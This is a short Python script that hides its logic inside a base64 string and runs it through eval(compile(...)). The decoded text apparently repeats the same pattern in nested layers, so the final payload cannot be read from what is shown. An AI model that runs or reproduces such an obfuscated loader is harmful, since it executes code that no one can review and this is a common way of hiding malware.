import base64
oOO0oooOO = "aW1wb3J0IGJhc2U2NApvT08wb29vT08gPSAiYVcxd2IzSjBJR0poYzJVMk5BcHZUMDh3YjI5dlQwOGdQU0FpWVZjeGQySXpTakJKUjBwb1l6SlZNazVCY0haVU1EaDNZakk1ZGxRd09HZFFVMEZwV1ZaamVHUXlTWHBUYWtKS1VqQndiMWw2U2xaTmF6VkNZMGhhVlUxRWFETlpha2sxWkd4UmQwOUhaRkZWTUVad1ZURm9jMUV3TVhSU2JHaE9Va1p3YUZZd1pHOU5NV1JYV1hwR2FFMXNTa2xWYlRGelZVZEtjazVVUWxoV2JXaE1WRlZrUjFkRk5WaGtSMFpYWld4V00xWkVTVEZWTWtaSFlraFdWV0ZyU25CVVZFSkdUbFpTY2xWdVpHeGlWV3cxVmpKd1EyRXhTWGRYYmtKYVpXczFWRnBITVU5U1ZURkZVV3hDYVdGNlZqSlhWbHByV1ZVeFNGVlliR2xTTTFKeVZXcEthazVXVW5KVmJscFVUVWQzTVZWV2FGTlVSMFpWVVcwMVdGWkZhekZaVkVwSFYwVTFXRTVXUW1oV1ZXdzBWMnRXYTFkdFVrWlBWVkpTVjBaS1RWbFdVa05VUm1SMFRsVjBhMkpWY0ZWVlZ6VmhZV3hKZUZkcVJsaGlSMmhNV2tSQ2MxTkhTa2xWYlhCVFpXMTNNVmRyVms5Uk1sSklVMWhzVm1KWWFIQlZNRlY0Wld4T1ZscEhSbXBTYmtKWldsVmtNR0Z0VmxsYVJ6VllWbTFvUkZrd1ZrOWtSbVIxWWtkc1RtRnJTblZYVjNCUFVUSktTRk51VWxkaWJYaHhWVmh3VjJNeGNGWmFSVGxwVWpBMVNsWlhOVU5oVlRGeFZtcGFWRlpYVW5wYVJXUlBVMFU1V1dKSGRGSk5SWEJaVmpGYWEwNUhUa2RqUldoVFlXdEtiMVp1Y0hOTlZsWnpZVVYwYkZZd2JEWlZNVll3WVVaYU5sSnFUbHBoYXpWTVZGVldjMU5XVG5SbFJWSmhUVEJLZUZkWGRHdFNNbFowVkdwV1VtRXhTbkJVVjNCWFpFWnNWMXBIZEdGaVIzZ3dWbFpqTldGV1dqWmlTRXBZWWtkUk1GcFhkRFJqYXpGWlYyMUdVMDFXY0RaVmVrWlRaR3hOZDFSc1pGQlhSbHBoVm01d1IyTXhUbFpWV0dSaFRVYzVOVlpITldGaFYwcFhZMGhrV0dGclZURlpWbHAzVWtacmQyUkZjRkpOUlZwTVZWUkthMk15Vm5OalJteFVZV3R3YjFacVJrdE5iR3Q1WWtWS1VGWlhlRWxXTWpWRFdWWlplbUZJU2xwTk1uTjRWV3RrUjFOR1NuVmlSWGhTVFVoQ1ZsWXllRzlUTURGMFVteG9WbUpzY0hGWlZsWnpaV3hPVm1GRk9XcFNNVm93Vm14a2ExVldWWGRTYWxKVllrVTFlVlV5ZEU5aWJVcEpXa2QwVjAxV2J6RlhhMVpxVGtadmVGRnNVbEppVkVadlZtcEdZV1ZzWkhKaFJUVnJWbXRXTlZsVlpHOWhiVVpZV2toQ1YxWlhhRmhaYTJSUFpGWldkVmRyY0doWFIxSjFWMWh3UzJNd05YTmpSbEpTVmtkNFMxVnJXa2RrTVVWNVdraE9hRlp1UWtsVmJYQkRZVlV3ZDAxWE5WWlNhelZFV1d4a1IxZEdXblZVYlVaVVVsUkZlRlpXVWt0aU1rWklWRzVDWVUxdGVGTlpWRVpMWWpGd1JsbDZWbXhoTW5oM1drUkthMkZyTVhSa2VrcFlZa1UxUTFReFZuTlNWbHBaV2tWNFZsWjZiRXhYYTFwdlZEQXhWMkpHYkZSaWEwcHdXbFpXUms1V1RsWmFSMFpxVW01Q1dWcFZaREJoYlZaVlZtdFdXbFpYVWtoYVZsWXdVa1pPYzFkdGNFNU5WbkIyVjFSSmVHTXlVbkppU0VKclRXMVNjVlJYTVROTmJHUnpWR3RLVUZaWGVFWldiR2hyVkVaV1dFOVZkRnBOUjFKSVdsY3hUbVZzY0VsWGJYQnBWbXRhZFZaVldrOVJNa3BZVW14b1YySnJOV2hWTUZWNFRWWldWVk50T1doU01EVjNWMnBLYzFac1NYZFhhbHBhWldzMWNscEhNVTlrUmxaWVlrVXhVazFGYnpKWFZscHZaREpLUm1KRlZrNVNNbEpRVm10V1IyUXhSWGxhU0VwVVRVVTFWMVZYTVc5aGJFbDVaRVJHV21KSGFGaFpla3BUVTBkRmQyUkZjRkpOUlZwMVZURldWMUV5UmtoVWEyaG9UVEZhYUZWcVJtRk5NV1J6V1hwR2FFMXJOREZYYWtreFlXc3hjMWRxVm1GU2VrWjZXVlJLU21Wc1RsaE9WVEZTVFVWYU1WZFVRbTlXTWtwSVZHNVdWbUpzY0V4YVZtUXdWRVpPVmxSclNtRk5SM2hKVmxjeE5GbFhSbFpUYWtaWVZtMU9ORmxyV201bFZuQklaVWQwVWsxdFp6SldNbmhyVGtkS1ZtUkdWbWxOU0ZKTFZWUkNSMkpzVGxaVWEwcGhUVWQ0UlZWWE5YTlpWbVJHVGtob1dtRXlhRk5YYWtaRFZrWkdkRk5zYkZaV2VteDFWVEZXVDFGc2IzZGlSVkpTVmpKU1MxVnFSbmROYkd0NVlrVk9hbEpYZUVsWmEyaFhVMnhPUms1WVRscGhNbEpoVkcxMFQySnRSWGRqUlZKWFpXeGFkbGRYZUd0V2JHOTRVV3hTVWxZeWVFeFdNRlYzVFd4T2MyRkZOV3RoTTBKYVZrWmtjMU5zUlhoV2JUVlVUVWRTZVZwR1pFNWxWbHAxWWtkMGFWWXphSGxYVjNCUFUyMU5kMkpGYUdoTk1WcHhWVEJhWVdNeGEzbE9WazVyWVROb1JWVlhOVU5VVjBwV1kwaEtXRlp0YUZSYVJ6RlBUbGRGZDJSRmNGSk5SVnAxVlRGV1QxRnNiM2RpUlZKU1ZqSlNTMVZVUWtkaWJHdDVUVlprYkdKV1NsbGFWVkpEVkZkS1ZsZHFUbHBOUjFKWVdrWmFkMUpHYjNsUFYyaFdaV3hhTTFZeWRFOU5NVzk1VTI1U1UySnNTbWhXVkVvd1pERkZlV0pGU21GTlIzaEZWVlprYTFOc1JYZFNiVFZhVFdwR1dGUlZaRk5YVms1MVZtdHdWRkpZUW5wWFdIQlBWakpOZVZWclNtbGxha0p3VVRJeFYwMXNiRmhrTWpsYVRXcHNNRmt3WkhOak1YQlVZVWRzV2xkRk5YTlViWEJTWkZac2NWZFVRbUZTTVZweFdXcEtVMkpGZEVoUFZrSlZaV3RLTWxscVNUVlZSbEkxWVROT1NsRXdhelJaZWs1VFpWZEdXRTVYTlZGaFZXeDZVMVZPYTJKSFZraFdiWEJMWlZkMGQwbG5jR3hrYlVaelMwZE9kbUpZUW5CaVIxVnZXVzFHZWxwVVdUQk1iVWt5VGtkU2JGa3lPV3RhVTJoMlZEQTRkMkl5T1haVU1EaHdURU5CYVZCSVRqQmpiV3gxV25vMGFVeERRVzVhV0doc1dYbGpjRXRSUFQwaUNtVjJZV3dvWTI5dGNHbHNaU2hpWVhObE5qUXVZalkwWkdWamIyUmxLRzlQVHpCdmIyOVBUeWtzSUNJOGMzUnlhVzVuUGlJc0lDZGxlR1ZqSnlrcCIKZXZhbChjb21waWxlKGJhc2U2NC5iNjRkZWNvZGUob09PMG9vb09PKSwgIjxzdHJpbmc+IiwgJ2V4ZWMnKSk="
eval(compile(base64.b64decode(oOO0oooOO), "<string>", 'exec'))